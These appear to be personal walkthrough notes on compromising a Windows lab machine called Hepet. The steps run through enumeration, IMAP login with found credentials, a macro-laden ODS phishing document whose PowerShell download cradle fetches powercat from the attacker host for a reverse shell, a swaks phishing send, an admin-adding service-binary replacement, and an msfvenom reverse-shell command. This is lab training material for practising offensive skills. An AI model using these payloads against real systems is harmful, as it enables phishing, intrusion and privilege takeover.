# NMAP

```
sudo nmap -sC -sV 192.168.236.140 -oN nmap-hepet
```

![[PG/Windows/attachments/Pasted image 20250706211644.png]]

All ports 
![[PG/Windows/attachments/Pasted image 20250706214219.png]]

# Website (8000)

![[PG/Windows/attachments/Pasted image 20250706211757.png]]

Some usernames
![[PG/Windows/attachments/Pasted image 20250706211848.png]]

![[PG/Windows/attachments/Pasted image 20250706212256.png]]



Kick off feroxbuster in the background
```
feroxbuster -u http://192.168.236.140:8000/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

![[PG/Windows/attachments/Pasted image 20250706212020.png]]

The forms for user input don't go anywhere.

![[PG/Windows/attachments/Pasted image 20250706212346.png]]

Create username list 

![[PG/Windows/attachments/Pasted image 20250706212530.png]]

# Website (443)

Looks the same
![[PG/Windows/attachments/Pasted image 20250706213046.png]]
# SMB

```
nxc smb 192.168.236.140 -u 'jonas' -p 'SicMundusCreatusEst' --shares
```

![[PG/Windows/attachments/Pasted image 20250706212654.png]]

Add hepet to /etc/hosts

## Password Spraying
![[PG/Windows/attachments/Pasted image 20250706215448.png]]
- nope 

![[PG/Windows/attachments/Pasted image 20250706215520.png]]
- nope

# POPPASS??

![[PG/Windows/attachments/Pasted image 20250706213122.png]]


# Finger 
![[PG/Windows/attachments/Pasted image 20250706213204.png]]

Trying this out to enum usernames too https://raw.githubusercontent.com/dev-angelist/Finger-User-Enumeration/refs/heads/main/finger_user_enumeration.py

```
python3 finger_user_enumeration.py -t 192.168.236.140 -p 79 -w /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt 
```
- not sure if this works at all bc none of the username from my list hit.
# RPC

```
rpcclient -U '' -N 192.168.236.140
```
- nope

![[PG/Windows/attachments/Pasted image 20250706214243.png]]

# SMTP 

User enum 

```
smtp-user-enum -M VRFY -U users.txt -t 192.168.236.140
```

5/6 users valid. 

![[PG/Windows/attachments/Pasted image 20250706215053.png]]

# IMAP

Connect to IMAP using Telnet and credentials `Jonas:SicMundusCreatusEst`

```
telnet 192.168.236.140 143
```

```
a1 login "jonas" "SicMundusCreatusEst"
```


![[PG/Windows/attachments/Pasted image 20250706220423.png]]

Look up how to read the messages...

Read emails
```
a2 fetch 4 body []
```

Reading emails

![[PG/Windows/attachments/Pasted image 20250706221318.png]]

Suggests docs susceptible to macro attacks 

![[PG/Windows/attachments/Pasted image 20250706221508.png]]

# Phishing Email 

Use this tool to create a malicious doc https://github.com/0bfxgh0st/MMG-LO/

Adjust macro to download powercat.ps1 from Python3 web server and use it to establish a reverse shell

```
build_payload = (f'IEX(New-Object System.Net.WebClient).DownloadString("http://192.168.45.152/powercat.ps1");powercat -c {ip} -p {port} -e powershell')
```

```
 payload = 'powershell.exe -windowstyle hidden -ExecutionPolicy Bypass -e ' + base64payload
```

![[PG/Windows/attachments/Pasted image 20250706231643.png]]

![[PG/Windows/attachments/Pasted image 20250706231740.png]]

Now generate malicious ODS file 

```
python3 mmg-ods.py windows <ATTACKER IP> <ATTACKER PORT>
```

```
python3 mmg-ods.py windows 192.168.45.152 9001
```

Stupid indent error fixed with sed magic
```
┌──(cadet㉿kali)-[~/PG/Windows/hepet]
└─$ python3 mal-doc.py windows 192.168.45.152 9001
  File "/home/cadet/PG/Windows/hepet/mal-doc.py", line 206
    bytes_encoded = (base64.b64encode(bytes(build_payload, 'utf-16le')))
                                                                        ^
IndentationError: unindent does not match any outer indentation level
                                                                                                          
┌──(cadet㉿kali)-[~/PG/Windows/hepet]
└─$ sed -i 's/\t/    /g' mal-doc.py

```

![[PG/Windows/attachments/Pasted image 20250706232936.png]]
- got file.ods

Get this set up 

![[PG/Windows/attachments/Pasted image 20250706233029.png]]

# Phishing 

Use #swaks to send this malicious file to mailadmin 

```
sudo swaks -t mailadmin@localhost --from jonas@localhost --attach @file.ods --server 192.168.236.140 --body "Please check this spreadsheet" --header "Subject: Please check this spreadsheet"
```

```
SicMundusCreatusEst
```

Be sure quotes aren't borked 🙄
![[PG/Windows/attachments/Pasted image 20250706233604.png]]

Successful phish 
![[PG/Windows/attachments/Pasted image 20250706233532.png]]

Catch Reverse Shell 

![[PG/Windows/attachments/Pasted image 20250706234300.png]]

I'm ela

![[PG/Windows/attachments/Pasted image 20250706234413.png]]

 ![[PG/Windows/attachments/Pasted image 20250706234552.png]]

![[PG/Windows/attachments/Pasted image 20250706234729.png]]

# Priv Esc

Notice `Veyon` directory in `C:`

Check for unquoted service paths
```
Get-CimInstance -ClassName win32_service | Select Name,State,PathName
```
![[PG/Windows/attachments/Pasted image 20250706235038.png]]

Maybe we can actually do the thing 

![[PG/Windows/attachments/Pasted image 20250706235357.png]]

Try to add an admin 

adduser.c 
```C
#include <stdlib.h>

int main ()
{
  int i;
  
  i = system ("net user cadet password1! /add");
  i = system ("net localgroup administrators cadet /add");
  
  return 0;
}
```

Compile
```
x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
```

Transfer
```
iwr -uri http://192.168.45.152:81/adduser.exe -Outfile adduser.exe
```
![[PG/Windows/attachments/Pasted image 20250707000836.png]]
Move original `veyon-service.exe` to `C:\Users\Ela Arwel\Temp `
```
move "C:\Users\Ela Arwel\Veyon\veyon-service.exe" "C:\Users\Ela Arwel\Temp"
```
![[PG/Windows/attachments/Pasted image 20250707000857.png]]
Move malicious binary in 
```
move .\adduser.exe "C:\Users\Ela Arwel\Veyon\veyon-service.exe"
```
![[PG/Windows/attachments/Pasted image 20250707000915.png]]
Stop the service 

```
net stop VeyonService
```
![[PG/Windows/attachments/Pasted image 20250707000940.png]]
Access denied

Reboot worked

```
shutdown /r /t 0
```

![[PG/Windows/attachments/Pasted image 20250707001025.png]]

Need to resend phishing email to get shell back.

I should have replaced the binary with a reverse shell..

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.152 LPORT=1338 -f exe -o rev.exe
```

Yeah I effed up with the add user thing. oh well.

